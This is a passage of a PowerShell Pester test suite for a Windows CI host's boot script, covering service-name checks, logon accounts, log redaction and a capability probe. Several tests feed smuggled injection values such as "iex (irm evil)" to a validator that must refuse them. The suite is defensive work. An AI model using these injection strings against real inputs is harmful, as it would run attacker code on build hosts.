            Should -Be 'actions.runner.a.b'
    }

    It 'refuses a name a slot could use to reach another service' {
        Get-RunnerServiceName -Marker 'actions.runner.a.b" delete "ci-beacon' -AgentName 'b' |
            Should -Be ''
    }

    It 'refuses a name that is not a runner service at all' {
        Get-RunnerServiceName -Marker 'ci-beacon' -AgentName 'ci-beacon' | Should -Be ''
    }

    It 'refuses an empty or missing marker' {
        Get-RunnerServiceName -Marker '' -AgentName 'h-s1' | Should -Be ''
        Get-RunnerServiceName -Marker '   ' -AgentName 'h-s1' | Should -Be ''
    }

    # Shape alone accepts any well-formed name. A stale or restored marker naming
    # a SIBLING slot's service would then get this slot's logon account, this
    # slot's environment block and this slot's recovery policy -- applied to an
    # agent that is already registered and running as somebody else.
    It 'refuses a well-formed name belonging to another slot' {
        Get-RunnerServiceName -Marker 'actions.runner.acme-infra.h-s2' -AgentName 'h-s1' |
            Should -Be ''
    }

    # Suffix, not substring. `h-s1` must not be satisfied by `...h-s11`, which is
    # a real neighbour on any host with ten or more slots.
    It 'refuses a longer agent name that merely ends with this one' {
        Get-RunnerServiceName -Marker 'actions.runner.acme-infra.h-s11' -AgentName 'h-s1' |
            Should -Be ''
    }
}

Describe 'service logon account' {
    # Four spellings of one local account. Rejecting three of them reports a
    # correctly configured service as a failed boot.
    It 'accepts every spelling the SCM uses for a local account' {
        Test-ServiceLogonAccount -StartName '.\ci-s1' -SlotUser 'ci-s1' | Should -BeTrue
        Test-ServiceLogonAccount -StartName 'WIN-ABC\ci-s1' -SlotUser 'ci-s1' | Should -BeTrue
        Test-ServiceLogonAccount -StartName 'ci-s1' -SlotUser 'ci-s1' | Should -BeTrue
        Test-ServiceLogonAccount -StartName '.\CI-S1' -SlotUser 'ci-s1' | Should -BeTrue
    }

    # THE THREE THIS FUNCTION EXISTS FOR. Each is machine-wide and shared by every
    # slot, and each is what the service runs as if the identity change did
    # nothing at all.
    It 'rejects each of the SCM defaults the identity change is meant to displace' {
        Test-ServiceLogonAccount -StartName 'LocalSystem' -SlotUser 'ci-s1' | Should -BeFalse
        Test-ServiceLogonAccount -StartName 'NT AUTHORITY\NetworkService' -SlotUser 'ci-s1' |
            Should -BeFalse
        Test-ServiceLogonAccount -StartName 'NT AUTHORITY\LocalService' -SlotUser 'ci-s1' |
            Should -BeFalse
    }

    It 'rejects a sibling slot, which is the other account on this host' {
        Test-ServiceLogonAccount -StartName '.\ci-s2' -SlotUser 'ci-s1' | Should -BeFalse
    }

    It 'reads an unreported account as not ours rather than as ours' {
        Test-ServiceLogonAccount -StartName '' -SlotUser 'ci-s1' | Should -BeFalse
        Test-ServiceLogonAccount -StartName $null -SlotUser 'ci-s1' | Should -BeFalse
    }
}

Describe 'boot logging stays out of the success stream' {
    # THIS IS THE ONE BLOCK IN THIS FILE THAT MUST NOT MOCK Write-BootLog.
    #
    # Every other impure test here does `Mock -CommandName Write-BootLog
    # -MockWith { }`, and that mock is exactly what hid a boot-fatal bug for the
    # life of this suite. Write-BootLog used `Write-Output`, which puts the line
    # on the SUCCESS stream, so every function that logged and then returned a
    # value returned an object[] of the log lines followed by the value:
    # Invoke-Phase0Preflight could not dot-source the beacon path it had just
    # captured, Register-SlotAgent's [string] -RegistrationToken received the
    # array space-joined into one string with a timestamped log line on the
    # front, and Invoke-Phase5Registration's [IDictionary] -Config would not
    # bind at all. Mocking the logger away makes every one of those disappear.
    #
    # So these cases RUN the real Write-BootLog and assert on the shape of what
    # a caller gets back. The bash gate (windows-host-startup.selftest.sh)
    # asserts the text; this asserts the behaviour, on the runtime, where the
    # array either is or is not there.
    BeforeEach {
        # The real path is C:\ci\ci-host.log, which does not exist on
        # ubuntu-latest -- Write-BootLog would swallow the failure and the test
        # would still be meaningful, but pointing it somewhere writable lets the
        # last case assert the file half is still doing its job.
        $script:LogPathBefore = $script:LogPath
        $script:LogPath = Join-Path ([System.IO.Path]::GetTempPath()) `
            ('ci-host-' + [guid]::NewGuid().ToString('N') + '.log')
    }

    AfterEach {
        Remove-Item -LiteralPath $script:LogPath -Force -ErrorAction SilentlyContinue
        $script:LogPath = $script:LogPathBefore
    }

    It 'lets a function that logs return its value as a scalar' {
        # The shape of Install-BeaconService: log, log, return a path. Phase 0
        # captures that path and dot-sources it, which an object[] cannot be.
        function Invoke-LogThenReturnPath {
            Write-BootLog 'shim: installed'
            Write-BootLog 'phase 0: beacon service running, interval 30s'
            return 'C:\ci\bin\ci-beacon.ps1'
        }

        $captured = Invoke-LogThenReturnPath
        @($captured).Count | Should -Be 1
        $captured | Should -BeOfType ([string])
        $captured | Should -Be 'C:\ci\bin\ci-beacon.ps1'
    }

    It 'hands a captured token to a [string] parameter with no log line joined to it' {
        # The shape of Wait-RegistrationToken into Register-SlotAgent. An
        # object[] bound to [string] is joined with spaces rather than refused,
        # which is why this failed silently: config.cmd got a real token with a
        # timestamped log line in front of it and reported an auth error.
        function Invoke-LogThenReturnToken {
            Write-BootLog 'phase 5: registration token present'
            return 'AABBCC112233'
        }
        function Test-TokenParameter {
            param([Parameter(Mandatory = $true)][string] $RegistrationToken)
            return $RegistrationToken
        }

        Test-TokenParameter -RegistrationToken (Invoke-LogThenReturnToken) |
            Should -Be 'AABBCC112233'
    }

    It 'returns a config that still binds to an [IDictionary] parameter' {
        # The shape of Invoke-Phase0Preflight into Invoke-Phase5Registration.
        # Member access such as $cfg.Slots survives the pollution by member
        # enumeration -- which is precisely why the fault read as working -- and
        # the parameter bind is where it actually stops.
        function Invoke-LogThenReturnConfig {
            Write-BootLog 'phase 0: preflight'
            Write-BootLog 'phase 0: image version 4 >= 1'
            Write-BootLog 'phase 0: ci/boot published'
            return [ordered] @{ Owner = 'owner'; Repo = 'repo' }
        }
        function Test-ConfigParameter {
            param([Parameter(Mandatory = $true)][System.Collections.IDictionary] $Config)
            return $Config.Owner
        }

        $cfg = Invoke-LogThenReturnConfig
        @($cfg).Count | Should -Be 1
        Test-ConfigParameter -Config $cfg | Should -Be 'owner'
    }

    It 'keeps a collected list of slot records free of log lines' {
        # The shape of Invoke-Phase1SlotSetup: a loop that appends one hash
        # table per slot while the callee logs. Polluted, the array carries
        # strings between the records, $_.User is $null for each of them, and
        # the phase 5 count is wrong on a host whose every log line says success.
        function Invoke-LogThenReturnRecord {
            param([int] $Index)
            Write-BootLog "phase 1: slot $Index provisioned as ci-s$Index"
            return @{ Index = $Index; User = "ci-s$Index" }
        }

        $collected = @()
        for ($i = 1; $i -le 3; $i++) { $collected += (Invoke-LogThenReturnRecord -Index $i) }
        $collected.Count | Should -Be 3
        # Joined rather than compared element-wise: a polluted array yields a
        # $null User for every log line it carries, and an empty segment in this
        # string is exactly what that looks like.
        (@($collected | ForEach-Object { $_.User }) -join ',') |
            Should -Be 'ci-s1,ci-s2,ci-s3'
    }

    It 'still writes the line to the boot log, and still survives losing it' {
        Write-BootLog 'phase 0: preflight'
        (Get-Content -Raw -LiteralPath $script:LogPath) | Should -Match 'phase 0: preflight'

        # The other half of Write-BootLog is deliberately unchanged: the log is
        # diagnostics, and losing it must never stop a boot. Restored afterwards
        # so AfterEach still cleans up the file the first half created.
        $writable = $script:LogPath
        try {
            $script:LogPath = Join-Path ([System.IO.Path]::GetTempPath()) `
                (Join-Path ('no-such-dir-' + [guid]::NewGuid().ToString('N')) 'ci-host.log')
            { Write-BootLog 'phase 0: preflight' } | Should -Not -Throw
        } finally {
            $script:LogPath = $writable
        }
    }
}

Describe 'boot log redaction' {
    It 'strikes the registration token out of a captured line' {
        Get-RedactedLine -Line 'config: --token AABBCC ok' -Secret 'AABBCC' |
            Should -Be 'config: --token *** ok'
    }

    # '' is a substring of every string. Redacting on it turns the whole boot log
    # into asterisks, which is how a failing boot stops being diagnosable.
    It 'leaves the line alone when there is no secret to strike' {
        Get-RedactedLine -Line 'config: authenticated' -Secret '' |
            Should -Be 'config: authenticated'
    }

    It 'strikes every occurrence, not just the first' {
        Get-RedactedLine -Line 'T=AABBCC retry T=AABBCC' -Secret 'AABBCC' |
            Should -Be 'T=*** retry T=***'
    }
}

Describe 'service environment block' {
    It 'renders each entry as NAME=VALUE' {
        $v = Get-ServiceEnvironmentValue -Environment ([ordered] @{ TMP = '/t'; TEMP = '/t' })
        $v | Should -Contain 'TMP=/t'
        $v.Count | Should -Be 2
    }

    # REG_MULTI_SZ is NUL-delimited: an embedded NUL does not corrupt the write,
    # it TRUNCATES the block there, and on this block the entries that would
    # disappear are the per-job credential reset hooks.
    It 'refuses a value carrying a NUL, which would truncate the block' {
        { Get-ServiceEnvironmentValue -Environment ([ordered] @{ TMP = "/t`0X=1" }) } | Should -Throw
    }

    It 'refuses a value carrying a newline' {
        { Get-ServiceEnvironmentValue -Environment ([ordered] @{ TMP = "/t`nX=1" }) } | Should -Throw
    }

    # The block is the last thing between instance metadata and a service that
    # starts as a local account, and section 3A accepts that a Windows host cannot
    # assume its metadata is untampered.
    It 'refuses a name that is not an environment variable name' {
        { Get-ServiceEnvironmentValue -Environment ([ordered] @{ 'TMP X' = '/t' }) } | Should -Throw
    }

    It 'carries the reset hooks straight through from the slot block' {
        $block = Get-SlotServiceEnvironment -Index 1 -BrokerEndpoint '' -SlotRoot '/ci/slots'
        $v = Get-ServiceEnvironmentValue -Environment $block
        ($v -join "`n") | Should -Match 'ACTIONS_RUNNER_HOOK_JOB_COMPLETED='
    }
}

Describe 'negative capability' {
    # 403 is the only proof. Everything else is either the finding itself or an
    # unproved check, and both must fail the boot.
    It 'accepts a 403 and only a 403' {
        Test-NegativeCapability -StatusCode 403 | Should -BeTrue
        Test-NegativeCapability -StatusCode '403' | Should -BeTrue
    }

    It 'rejects a 200, which is the finding this phase exists to catch' {
        Test-NegativeCapability -StatusCode 200 | Should -BeFalse
    }

    # A probe whose token acquisition failed answers 401 to everything and would
    # otherwise report a perfect score.
    It 'rejects a 401, which says nothing about what the credential can do' {
        Test-NegativeCapability -StatusCode 401 | Should -BeFalse
    }

    It 'reads an unreachable endpoint as unproved rather than as proved' {
        Test-NegativeCapability -StatusCode $null | Should -BeFalse
        Test-NegativeCapability -StatusCode 'timeout' | Should -BeFalse
    }
}

Describe 'probe verdict' {
    BeforeAll {
        $script:CleanProbe = {
            [pscustomobject] @{
                hostToken     = $true; secretStatus = 403; metricStatus = 403
                brokerEmail   = 'jobs@p.iam.gserviceaccount.com'
                siblingStatus = 'denied'; cacheWritable = $true; dnsResolved = $true
            }
        }
    }

    It 'passes a host that proved every property' {
        Get-ProbeFailure -Result (& $script:CleanProbe) `
            -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' | Should -BeNullOrEmpty
    }

    # The case the whole function exists to get right: a service that never
    # started writes no file, and "no file" must not read as "no findings".
    It 'reports a missing verdict as a failure rather than as a pass' {
        $f = @(Get-ProbeFailure -Result $null -JobServiceAccount '')
        $f.Count | Should -Be 1
        $f[0] | Should -Match 'no verdict'
    }

    It 'fails a host whose identity can still read the App key' {
        $r = & $script:CleanProbe
        $r.secretStatus = 200
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail) -join "`n") |
            Should -Match 'secretmanager'
    }

    It 'fails a host whose identity can still write the demand metric' {
        $r = & $script:CleanProbe
        $r.metricStatus = 200
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail) -join "`n") |
            Should -Match 'timeSeries'
    }

    # Two perfect 401s are not two passes.
    It 'fails a probe that never obtained a host token, whatever else it reported' {
        $r = & $script:CleanProbe
        $r.hostToken = $false
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail) -join "`n") |
            Should -Match 'could not obtain a host token'
    }

    # The failure the broker exists to prevent, and the one that looks most like
    # a working broker from every other angle.
    It 'fails a broker that fell back to the host identity' {
        $r = & $script:CleanProbe
        $r.brokerEmail = 'host@p.iam.gserviceaccount.com'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount 'jobs@p.iam.gserviceaccount.com') -join "`n") |
            Should -Match 'vends'
    }

    It 'fails a broker that answered at all on a pool that configured none' {
        $r = & $script:CleanProbe
        (@(Get-ProbeFailure -Result $r -JobServiceAccount '') -join "`n") |
            Should -Match 'configured no job service account'
    }

    It 'passes a no-broker pool that reported no broker' {
        $r = & $script:CleanProbe
        $r.brokerEmail = ''
        Get-ProbeFailure -Result $r -JobServiceAccount '' | Should -BeNullOrEmpty
    }

    It 'fails a slot that could read a sibling workspace' {
        $r = & $script:CleanProbe
        $r.siblingStatus = 'allowed'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail) -join "`n") |
            Should -Match 'another slot'
    }

    # The reviewer's case: Get-ChildItem throws identically on denied and on
    # absent, so a sibling workspace that had not been created yet would report
    # a proved ACL boundary if the payload folded the two together.
    It 'refuses to read an absent sibling workspace as a proved boundary' {
        $r = & $script:CleanProbe
        $r.siblingStatus = 'missing'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail) -join "`n") |
            Should -Match 'never tested'
    }

    It 'reports any other sibling outcome as unproved' {
        $r = & $script:CleanProbe
        $r.siblingStatus = 'error'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail) -join "`n") |
            Should -Match 'unproved'
    }

    # Service-account emails are canonically lowercase, so a case difference is
    # a different identity being passed off as the configured one.
    It 'holds the broker to the exact identity, case included' {
        $r = & $script:CleanProbe
        (@(Get-ProbeFailure -Result $r -JobServiceAccount 'Jobs@p.iam.gserviceaccount.com') -join "`n") |
            Should -Match 'vends'
    }

    It 'fails an unwritable cache and an unresolvable name' {
        $r = & $script:CleanProbe
        $r.cacheWritable = $false
        $r.dnsResolved = $false
        @(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail).Count | Should -Be 2
    }

    # All of them, not the first. The operator gets one look at the serial
    # console before the controller reclaims the instance.
    It 'reports every reason at once' {
        $r = [pscustomobject] @{
            hostToken     = $false; secretStatus = 200; metricStatus = 200
            brokerEmail   = ''; siblingStatus = 'allowed'; cacheWritable = $false; dnsResolved = $false
        }
        @(Get-ProbeFailure -Result $r -JobServiceAccount 'jobs@p.iam.gserviceaccount.com').Count |
            Should -Be 7
    }

    # A verdict written by an older image lacks fields this one reads. Absent is
    # not true, and an unknown property must not throw its way past the gate.
    It 'treats an absent field as unproved rather than throwing' {
        $f = @(Get-ProbeFailure -Result ([pscustomobject] @{ hostToken = $true }) -JobServiceAccount '')
        $f.Count | Should -Be 5
    }
}

Describe 'probe payload' {
    BeforeAll {
        $script:Payload = Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '127.0.0.1:8081' `
            -SiblingWorkspace 'C:\ci\slots\ci-s2\w' -CacheRoot 'C:\ci\slots\ci-s1\w' `
            -ResultPath 'C:\ci\boot-probe.json'
    }

    # The real metadata server, never the broker. The question is what a job can
    # reach behind the script's back; asking the broker would measure the
    # environment block instead of the identity.
    It 'spends a token minted by the real metadata server' {
        $script:Payload |
            Should -Match '169\.254\.169\.254/computeMetadata/v1/instance/service-accounts/default/token'
    }

    It 'tries both capabilities the reduction removed' {
        $script:Payload | Should -Match 'secretmanager\.googleapis\.com'
        $script:Payload | Should -Match 'monitoring\.googleapis\.com'
    }

    It 'names the secret it was told to try, not a placeholder' {
        $script:Payload | Should -Match 'secrets/app-key/versions/latest:access'
    }

    It 'reads the broker at the endpoint it was given' {
        $script:Payload | Should -Match 'http://127\.0\.0\.1:8081/computeMetadata'
    }

    # A payload that decides is a payload whose verdict came from the account
    # under test. It records; Get-ProbeFailure decides.
    It 'never denies a boot from inside the unprivileged payload' {
        $script:Payload | Should -Not -Match 'Deny-Boot'
    }

    It 'writes its verdict where the boot script looks for it' {
        $script:Payload | Should -Match "Set-Content -LiteralPath 'C:\\ci\\boot-probe\.json'"
    }

    It 'is valid PowerShell rather than merely a string' {
        { [scriptblock]::Create($script:Payload) } | Should -Not -Throw
    }

    It 'omits the broker read entirely when there is no broker' {
        $p = Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
            -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1'
        $p | Should -Not -Match 'service-accounts/default/email'
    }
}

Describe 'probe literal safety' {
    # Everything Get-ProbeScript interpolates becomes code in a payload that
    # runs holding a live host token, and the secret name and broker endpoint
    # both arrive from instance metadata -- which section 3A says outright is
    # writable by anything holding the machine's identity.
    It 'accepts the shapes the pool actually produces' {
        Test-ProbeLiteral -Value 'ci-app-key' -Kind 'name' | Should -BeTrue
        Test-ProbeLiteral -Value '127.0.0.1:8081' -Kind 'endpoint' | Should -BeTrue
        Test-ProbeLiteral -Value 'C:\ci\slots\ci-s1\w' -Kind 'path' | Should -BeTrue
    }

    It 'accepts an empty value, which means the caller configured nothing' {
        Test-ProbeLiteral -Value '' -Kind 'name' | Should -BeTrue
        Test-ProbeLiteral -Value '' -Kind 'endpoint' | Should -BeTrue
    }

    # One apostrophe closes the literal it lands in and appends statements.
    It 'rejects a value that would close its own literal' {
        Test-ProbeLiteral -Value "k'; iex (irm evil); '" -Kind 'name' | Should -BeFalse
        Test-ProbeLiteral -Value "1.2.3.4:1'; iex (irm evil); '" -Kind 'endpoint' | Should -BeFalse
        Test-ProbeLiteral -Value "C:\w'; iex (irm evil); '" -Kind 'path' | Should -BeFalse
    }

    It 'rejects a subexpression and a newline as well as a quote' {
        Test-ProbeLiteral -Value 'a$(hostname)' -Kind 'name' | Should -BeFalse
        Test-ProbeLiteral -Value "a`nb" -Kind 'name' | Should -BeFalse
        Test-ProbeLiteral -Value 'host:80/x' -Kind 'endpoint' | Should -BeFalse
    }

    # Throw, not sanitize: a stripped value still builds a payload, and a
    # payload that measured the wrong secret is worse than a stopped boot.
    It 'refuses to build a payload from an injected secret name' {
        { Get-ProbeScript -SecretName "k'; iex (irm evil); '" -BrokerEndpoint '' `
                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
    }

    It 'refuses to build a payload from an injected broker endpoint' {
        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint "1.2.3.4:1'; iex (irm evil); '" `
                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
    }

    # MetadataRoot is a parameter like the rest, and "no caller overrides it
    # today" is a property of the callers, not of the function. The contract
    # this guard states is that EVERY interpolated value is validated.
    It 'validates the metadata root it was handed, not just the ones from metadata' {
        Test-ProbeLiteral -Value 'http://169.254.169.254/computeMetadata/v1' -Kind 'url' | Should -BeTrue
        Test-ProbeLiteral -Value "http://h/v1'; iex (irm evil); '" -Kind 'url' | Should -BeFalse
        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' `
                -MetadataRoot "http://h/v1'; iex (irm evil); '" } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
    }

    It 'refuses to build a payload from an injected path' {
        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
                -SiblingWorkspace "C:\s2'; iex (irm evil); '" -CacheRoot 'C:\s1' } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' -ResultPath "C:'; iex (irm evil); '" } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
    }
}

Describe 'probe service definition' {
    BeforeAll {
        $script:ProbeXml = Get-ProbeServiceConfig -ScriptPath 'C:\ci\bin\ci-boot-probe.ps1'
    }

    # Manual and non-restarting, unlike every other service this file installs.
    # The probe is a one-shot measurement: Automatic re-runs it on a reboot the
    # boot script is not driving, and a restart policy turns a payload that
    # cannot start into a loop instead of the missing file the verdict needs.
    It 'does not start itself on a later boot' {
        $script:ProbeXml | Should -Match '<startmode>Manual</startmode>'
    }

    It 'has no restart policy, so a payload that cannot start stays not started' {
        $script:ProbeXml | Should -Not -Match 'onfailure'
    }

    It 'runs the payload it was given, non-interactively' {
        $script:ProbeXml | Should -Match 'ci-boot-probe\.ps1'
        $script:ProbeXml | Should -Match '\-NonInteractive'
    }

    It 'is well-formed XML' {
        { [xml] $script:ProbeXml } | Should -Not -Throw
    }
}

Describe 'recovery-policy guard' {
    # These RUN the function rather than reading it, and that is the whole point.
    # Clear-ServiceRecoveryAction shipped on main calling Get-RunnerServiceName
    # without the -AgentName that had become mandatory: a ParameterBindingException
    # in phase 5 on every Windows boot, in a function both text-reading gates
    # happily parsed and linted. Nothing here reaches sc.exe -- every case is
    # refused by the guard first, which is also why it can run on ubuntu-latest.
    It 'refuses a name that is not a runner service at all' {
        { Clear-ServiceRecoveryAction -ServiceName 'not-a-runner-service' -AgentName 'ci-abc-s1' } |
            Should -Throw -ExpectedMessage '*not a runner service name*'
    }

    # Shape alone is not enough. A stale or restored .service file naming a
    # SIBLING slot's service is well-formed, and clearing recovery there would
    # take the policy off an agent this slot does not own.
    It 'refuses a well-formed name belonging to another slot' {
        { Clear-ServiceRecoveryAction -ServiceName 'actions.runner.o-r.ci-abc-s2' -AgentName 'ci-abc-s1' } |
            Should -Throw -ExpectedMessage '*not a runner service name*'
    }

    It 'refuses an empty marker rather than passing it to sc.exe' {
        { Clear-ServiceRecoveryAction -ServiceName ' ' -AgentName 'ci-abc-s1' } |
            Should -Throw -ExpectedMessage '*not a runner service name*'
    }
}
